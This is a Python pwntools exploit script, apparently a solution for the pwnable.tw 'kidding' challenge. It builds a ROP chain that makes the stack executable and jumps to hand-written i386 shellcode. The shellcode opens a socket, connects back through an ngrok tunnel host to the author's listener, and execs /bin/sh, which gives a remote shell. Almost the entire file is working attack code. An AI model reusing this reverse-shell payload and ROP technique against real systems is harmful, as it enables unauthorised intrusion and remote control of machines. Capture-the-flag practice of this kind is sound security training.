#!/usr/bin/env python3

from pwn import *
import socket

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("kidding_patched")

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *0x0804888F
b *0x80bd13b
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10303
        return remote(host, port)

p = conn()

ngrok_host = "0.tcp.ap.ngrok.io"
ip = socket.gethostbyname(ngrok_host)
port = 19451

shellcode = '''
    mov al, 0x66
    xor ebx, ebx
    push ebx
    inc ebx
    push ebx
    push 0x2
    mov ecx, esp
    int 0x80
'''

shellcode += '''    
    mov al, 0x3f
    dec ebx
    pop esi
    pop ecx
    int 0x80
'''

shellcode += f''' 
    mov al, 0x66
    mov bl, 0x3
    push {hex(u32(socket.inet_aton(ip)))}
    push {hex(u32(p16(socket.AF_INET) + p16(port, endian='big')))}
    mov ecx, esp
    push 0x10
    push ecx
    push 0x0
    mov ecx, esp
    int 0x80
'''

shellcode += '''
    mov al, 0xb
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
'''

pl = flat(
    0,0,
    0x8048902 - 0x18, # 0x8048902 (generic_start_main+66) —▸ 0x80e9fc8 (__libc_stack_end)
    0x080583c9, # pop ecx ; ret
    exe.symbols['_dl_make_stack_executable_hook'],
    0x080842c8, # inc dword ptr [ecx] ; ret
    0x80937f0, # <_dl_map_object_from_fd.constprop.7+3328>
    0x080bd13b, # jmp esp
) + asm(shellcode)

lg("payload len", len(pl))

listener = listen(1337)

s(p, pl)

conn_shell = listener.wait_for_connection()
ia(conn_shell)